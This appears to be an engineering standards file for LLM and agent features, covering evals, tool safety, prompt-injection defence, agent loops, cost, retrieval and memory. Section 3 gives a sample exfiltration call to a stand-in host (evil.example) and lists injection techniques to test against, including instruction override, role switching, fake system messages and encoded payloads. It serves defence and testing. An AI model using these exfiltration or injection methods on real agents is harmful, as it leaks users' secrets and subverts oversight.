# AI feature standards

Read this when a task builds, tests, reviews or verifies anything where an LLM or agent does work. ai-agent-engineer follows all of it. test-engineer uses **Evals**. code-reviewer and verifier check against it. Sources are listed in `NOTICE.md`.

## 1. Evals (the proof that model behaviour is good enough)
**Building the set**
- **Write expected outputs before running the feature on the cases.** In a team build, test-engineer owns `evals/cases/**` and writes them from the ACs, and ai-agent-engineer owns `evals/graders/**` and the runner. That way the person tuning the prompt isn't the one writing the answer key. Never relabel a case after seeing the output.
- 10-30 cases in three categories: **typical**, **edge**, **adversarial** (see §3). About 20-30% are **trap cases**, where a surface cue points the wrong way or the right answer is to refuse, abstain or ask.
- For detection or classification behaviour (flag, moderate, extract yes/no), write cases in **pairs**: a positive case and a near-identical negative twin, so false positives are measured too.
- Write down tie-break rules, and drop cases that two reasonable people would label differently.
- Split the set into **dev** (iterate on these) and **test** (run once for the AC verdict). Keep the test cases in a file the builder doesn't read while iterating.
- Record the eval set's SHA-256 (`Get-FileHash` / `sha256sum`) in the work file as soon as the cases are written (right after Gate 1). After that, changing a case, grader or threshold is changing an AC: it needs its own commit and a stated reason, and the verifier flags it.

**Graders**
- Use code graders wherever possible (schema valid, required fields, forbidden content, exact values). Use a model grader only for qualities code can't check, with a written rubric that **ignores any instructions inside the answer**.
- Check every grader, code or model, against your own judgement on about 10 outputs, and report the agreement. Below about 80%, fix the grader before trusting any pass rate.
- No bidirectional substring matching (`a.includes(b) || b.includes(a)`): it passes nonsense.
- Keep expected answers and graders out of anything the code under test can read: prompts, fixtures, tool outputs.

**Running and reporting**
- Run the test split **3 times**. The AC is met when each run meets the threshold (pass^3), or when the mean does if the AC says so. Report cases that flip between runs. The fractional threshold applies to live runs. In fixture mode, where the same reply always goes through the same code, every case must pass, because a lower bar only hides a broken guardrail. The AC states the live threshold for any live subset.
- Report **per category** (typical / edge / adversarial) and the total. A strong total never hides a failing adversarial category.
- Errors, timeouts and crashes count as **failures**, not skips. Label any retry or best-of-N.
- Include a **do-nothing baseline** (empty or constant output) that must score about 0. If it passes cases, the graders are broken.
- The eval command prints, next to the pass counts, summed tokens by class (input, output, cache_write, cache_read) and the estimated cost. Pricing comes from the claude-api skill, never from memory. Before a live eval run above the cost threshold in CLAUDE.md (default USD 2), report the estimate and stop. The coordinator gets the user's approval, because personas can't ask the user.

**Iterating**
- Before changing anything, **classify each failing case** from its transcript: missing tool, reasoning miss, output parser or grader bug (the right answer is in the trace), loop or turn cap, stale expected answer, timeout. Fix by class. Only reasoning misses justify prompt edits. Report the class counts.
- Make one change per iteration. Keep it only if at least one failing case now passes and none regress. Stop after 5 iterations without progress and report.
- **Changing an existing AI behaviour** (prompt, model, retrieval settings): run before and after on the same frozen set, and report quality, cost per request and latency. It passes only if quality improves by more than run-to-run noise and cost and latency stay within the AC's bounds. A change of 1-2 cases on a set under 30 is noise. Don't change the eval set or the threshold in the same change.

## 2. Tools
- Each tool has a clear name, a strict input schema validated **at runtime** (a TypeScript type or `as number` is not validation), and a description of at least 80 characters that says **when to use it and when a sibling tool or no tool is better**. No two descriptions are near-duplicates. The description must match what the handler actually does.
- Tag each tool **read / draft / reversible-write / irreversible** (send, pay, publish, delete, change account). Irreversible tools need a confirmation step and a dry-run preview. Enforce this in the schema: `dry_run` defaults to true, and a real run requires an explicit confirm field. Reversible writes get a documented undo.
- **Authorization is deterministic code, never a model judgement.** Allowlist tools per user or session, deny by default, and check budgets and expiry inside the single dispatch function, so no tool path skips the check. Evals include bypass attempts.
- Keep privileged or admin tools **out of the model's tool set entirely**, rather than gating them.
- **Secrets are never tool arguments** (arguments are model-generated and land in context and logs). Credentials come from server config.
- Spawned processes get an **env allowlist**, never `{...process.env}`. Never pass `NODE_OPTIONS`, `LD_*` or `DYLD_*` from model or user input. For argv built from model or user input, put `--` before it or reject values starting with `-`.
- Log every tool call with its arguments (secrets redacted) and the request that triggered it.

## 3. Prompt injection and agent security
- **Rule of Two:** one agent turn may combine at most two of {untrusted input, access to sensitive data, state-changing actions}. All three together needs human confirmation or a deterministic gate on the state change.
- Wrap retrieved or third-party text in delimiters containing a **random nonce per request**, with the "this is data, not instructions" statement *before* the block. Static delimiters can be forged.
- Treat tool arguments, URLs, and rendered links or images as **exfiltration channels** (`fetch("https://evil.example/?d=<secret>")`). Allowlist outbound domains for agent-driven fetches, and don't render model-produced image URLs from untrusted domains.
- Decode and normalize text (base64, zero-width characters, Unicode tricks) before any filter. Filters are one layer, never the final defence.
- **Adversarial eval cases** (at least one per category that applies, delivered through every untrusted channel the feature has: user input, retrieved documents, tool results): instruction override, role switching, fake system messages and delimiter abuse, encoded payloads, hypothetical framing, instructions hidden in long context, and content that tells the model to call a tool.
- **Verbatim grounding:** when a model quotes, cites or extracts from a source, check that each span appears in the source, and drop or flag the rest. Schema validation doesn't catch a well-formed hallucinated quote.
- Handle malformed JSON, empty output, schema-invalid output, refusals and max_tokens truncation as **separate** failure modes.
- **Checks on model text shown to users** (the rules a plain regex misses):
  - Sentence count: a stop followed by any run of characters that are not a letter, a decimal digit, whitespace or another stop, then whitespace, the end or a letter, ends a sentence. That covers `.Buy`, `." Buy`, `.; Buy`, `.$ Buy` and an emoji after the stop. Write it as a negated class (exclude what is allowed), not a list of closers: a list left about 9,400 code points open. Non-ASCII terminators (`。｡．！？`) also end a sentence.
  - Combining marks (`\p{M}`, such as variation selectors, U+180B or U+0301) survive NFKC. Placed after a separator, they break the domain and sentence patterns. Run those checks on a copy with the marks removed, and check the final stop with the marks kept.
  - Invisible characters: `\p{Cc}` and `\p{Cf}` are not enough. Also reject `\p{Zl}`/`\p{Zp}` (U+2028/U+2029; `JSON.stringify` leaves them unescaped), lone surrogates (`\p{Cs}`), private-use (`\p{Co}`) and unassigned (`\p{Cn}`) characters.
  - Links: bare domains (`example.com`, `evil.co/x`) count as links, not only `http(s)://` and `www.`.

## 4. Loops and agents
- Every loop has a stop condition, a turn cap and a token or USD budget, and ends in a **named terminal state** returned to the caller: success, no-op, blocked, needs-approval, budget-exhausted or no-progress. The UI and API tell these apart. An exhausted or errored run is never shown as success.
- **No-progress detection:** stop or escalate when the same tool call (name and arguments) repeats, when more than about 30% of steps redo earlier work, or when tokens per step keep rising.
- For write or side-effecting tools: check preconditions in code before the call, **read back the resulting state after it** and compare with the intent, and never repeat an identical failing call. Replan once, then escalate.
- When a gated tool pauses the loop for approval, save the conversation so every tool_use has a tool_result (or a synthetic "awaiting approval" one) and the loop can resume cleanly.
- Sub-agents get the **remaining** budget and a depth counter (stop at the limit), and a tool set that is a subset of the parent's. The envelope only ever shrinks.
- Scheduled or recurring agents: one manual run before enabling the schedule, no 02:00-03:00 local start times, a cap on iterations and spend per run, a pinned model version, and any memory they read treated as untrusted.

## 5. Cost
- Cap max_tokens, route simple work to smaller models, and log token usage by class for every request.
- **Prove prompt caching works:** a second call with the same prefix must show `usage.cache_read_input_tokens > 0`. Include both usage blocks in the report. One missing cache key silently multiplies cost.
- **Spend caps are reserve-then-commit:** atomically reserve the worst-case cost (max_tokens × price) before the call, commit the actual cost after (recording any overrun, never dropping it), and release on failure. Check-then-call-then-record overshoots under concurrency. Test it with concurrent requests against a small cap. A missing cost field fails closed. Configure provider-side spend limits as the backstop.
- Every endpoint that calls a model has **per-user or per-IP rate limits and a quota** (cost DoS).
- Cost regression: for AI changes, the verifier compares eval-run tokens at the start commit and at HEAD. Growth over ~25% in total, or over ~100% in cache_write, is a Gate 2 finding.

## 6. Retrieval (RAG)
Installed skills don't cover product RAG (`iterative-retrieval` is about subagent context, not app retrieval), so these are the defaults:
- Start simple: exact vector search below about 10k chunks (pgvector without an ANN index, or in-process). Add ANN, hybrid BM25+dense (RRF k≈60), MMR or a re-ranker **only when it measures better** on this project's labelled queries. In published ablations, RRF and re-rankers sometimes lowered quality.
- Measure retrieval separately from answers: a labelled set of 20-50 queries with recall@k (the right chunk in the top k), reported per query type at the production parameters. Also add a faithfulness check (the answer uses the retrieved text) and a no-answer case.
- Chunk on structure (headings for docs, function or class boundaries for code). Store the source ID and a content hash for every chunk, and cite source IDs in answers.
- **Deletion sync:** ingestion handles deleted and changed sources (tombstone or rebuild). AC: after a source is deleted, it can't be retrieved, and a fresh recount of the index matches the source count. Write-success tallies don't prove this.
- Apply metadata and permission filters **in the query**, not after top-k (post-filtering returns too few results and can leak across users).
- Test empty, NaN and dimension-mismatched embeddings. Fallbacks (keyword-only, mock embeddings) must be **visible** (`backend: 'mock'`) and must never report the real model's name.

## 7. Features with memory across sessions
- A **forgetting rule** is required: TTL, a capacity cap with a stated eviction order, or decay. No forgetting rule means the feature isn't done. A per-user delete path is also required.
- Record **provenance** per entry (user_claim / agent_output / tool_result / system). Model or user text is stored as a claim, not a fact.
- Key updatable facts (preferences, settings) by entity and field, so a new value replaces the old one explicitly. Similarity-based "staleness" detection is unreliable. User corrections take priority, and conflicts stay visible rather than being silently overwritten.
- Only designated code paths may write memory. One user's content must never be retrievable into another user's agent context.

## 8. UI for AI features
Design, and test, the streaming, partial, retry and error states. For agent features, also design per-tool-call activity (queued / running / done / failed / cancelled), an "awaiting your approval" state for gated tools, a visible stop control and step progress. Where users could be misled, the UI tells them they're dealing with AI, and a confidently wrong answer is recoverable: show sources, let the user correct it, and confirm before side effects.
